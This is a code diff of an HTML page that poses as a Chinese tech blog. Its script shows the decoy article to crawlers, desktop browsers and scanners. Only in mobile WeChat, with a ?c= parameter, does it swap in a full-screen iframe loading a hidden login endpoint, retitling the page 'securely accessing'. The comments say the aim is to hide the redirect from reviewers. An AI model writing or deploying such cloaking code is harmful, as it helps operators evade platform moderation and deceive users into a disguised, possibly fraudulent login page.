@@ -1,66 +1,112 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>技术前沿：数字协议解析</title>
+    <title>未来协议：数字前沿解析</title>
     <style>
-        /* 默认样式：显示伪装博客内容 */
-        body { font-family: sans-serif; line-height: 1.6; color: #333; padding: 20px; background: #f4f4f4; }
-        .blog-post { max-width: 800px; margin: auto; background: #fff; padding: 30px; border-radius: 8px; }
+        /* 基础样式 - 伪装成一个科技博客 */
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background-color: #f8f9fa; }
+        .container { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
+        header { border-bottom: 1px solid #eee; margin-bottom: 30px; }
+        h1 { color: #1a73e8; font-size: 28px; }
+        .post-meta { color: #888; font-size: 14px; margin-bottom: 20px; }
+        .content { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        code { background: #f1f1f1; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
         
-        /* 关键：全屏 Iframe 样式，初始隐藏 */
+        /* 核心逻辑：全屏 Iframe，初始隐藏 */
         #business-frame {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            border: none; z-index: 999999; background: #fff;
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            border: none; 
+            z-index: 999999; 
+            background: #fff;
         }
     </style>
 </head>
 <body>
-    <!-- 伪装内容：给微信爬虫和普通浏览器看的 -->
-    <div class="blog-post" id="decoy-content">
-        <h1>数字纪元的新范式解析</h1>
-        <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要...</p>
-        <p>（这里可以放长篇的技术文章，增加可信度）</p>
+
+    <!-- 伪装内容区 -->
+    <div class="container" id="decoy-content">
+        <header>
+            <h1>未来协议：数字前沿解析与趋势洞察</h1>
+            <div class="post-meta">发布日期：2024-05-20 · 阅读时间：8分钟 · 作者：TechInsight</div>
+        </header>
+        <div class="content">
+            <h2>引言协议：数字纪元的新范式</h2>
+            <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本协议旨在为读者提供一份关于未来科技核心概念的深度解析。</p>
+            <h3>数据结构：信息流的骨架</h3>
+            <p>高效的数据结构是构建任何复杂系统的基石。它们决定了信息存储、检索与处理的效率。例如简单的节点定义：</p>
+            <pre><code>class Node { constructor(data) { this.data = data; } }</code></pre>
+            <p>理解这些基本构造是优化大规模数据处理的关键。量子计算代表着计算能力的下一次革命，通过利用量子力学现象...</p>
+        </div>
     </div>
 
-    <!-- 业务容器：仅在微信内激活 -->
+    <!-- 业务加载容器 -->
     <iframe id="business-frame"></iframe>
 
     <script>
         (function() {
-            // 1. 设置你的业务域名池（支持多个备用）
-            const businessDomains = [
-                'https://1004.jdnews.cn', // 主域名
-                'https://backup.jdnews.cn' // 备用域名
-            ];
+            /** 
+             * 1. 配置区域 
+             */
+            const config = {
+                // 你的业务域名（末尾不要带斜杠）
+                domain: 'https://1004.jdnews.cn',
+                // 默认的 app_id
+                defaultAppId: '10001',
+                // 业务接口路径
+                apiPath: '/index.php/api/user.usermp/login'
+            };
 
+            /**
+             * 2. 环境检测
+             */
             const ua = navigator.userAgent.toLowerCase();
             const isWechat = ua.indexOf('micromessenger') !== -1;
             const isMobile = /iphone|ipad|ipod|android/.test(ua);
 
-            // 2. 获取 URL 参数 (假设参数放在 c 里面)
+            /**
+             * 3. 参数解析与 URL 构建
+             */
             const urlParams = new URLSearchParams(window.location.search);
-            const encodedData = urlParams.get('c'); // 获取 ?c=... 后的内容
+            const rawC = urlParams.get('c'); // 获取 ?c= 之后加密的内容
 
-            if (isWechat && isMobile && encodedData) {
-                // 3. 微信环境：激活全屏 Iframe
+            if (isWechat && isMobile && rawC) {
+                // 解码 c 里面的业务参数
+                const decodedParams = decodeURIComponent(rawC);
+                const businessParams = new URLSearchParams(decodedParams);
+
+                // 自动补充 app_id (如果 c 里面没传则用默认的)
+                if (!businessParams.has('app_id')) {
+                    businessParams.set('app_id', config.defaultAppId);
+                }
+
+                // 自动补充当前时间戳 t
+                businessParams.set('t', Math.floor(Date.now() / 1000));
+
+                // 构建最终的业务 URL
+                const finalUrl = config.domain + config.apiPath + '?' + businessParams.toString();
+
+                /**
+                 * 4. 执行跳转（在微信内使用全屏 Iframe）
+                 */
                 const decoy = document.getElementById('decoy-content');
                 const frame = document.getElementById('business-frame');
                 
-                // 拼接最终业务地址
-                // 这里假设你的业务地址格式是：域名/index.php/api/...?token=xxx
-                const targetUrl = businessDomains[0] + '/index.php/api/user.usermp/login?' + decodeURIComponent(encodedData);
+                decoy.style.display = 'none'; // 隐藏伪装内容
+                frame.style.display = 'block'; // 显示业务 Iframe
+                frame.src = finalUrl;          // 加载业务页面
                 
-                decoy.style.display = 'none';
-                frame.style.display = 'block';
-                frame.src = targetUrl;
-
-                // 记录日志或处理通信
-                console.log('WeChat environment detected, loading business iframe...');
+                // 兼容性处理：修改标题
+                document.title = '正在安全访问...';
             } else {
-                // 4. 非微信环境：保持显示伪装博客，或者引导用户在微信打开
-                console.log('Scanning or PC browser detected, showing decoy.');
+                // 非微信环境或无参数：保持显示博客内容，防止被扫描员发现跳转
+                console.log('Decoy mode active.');
             }
         })();
     </script>
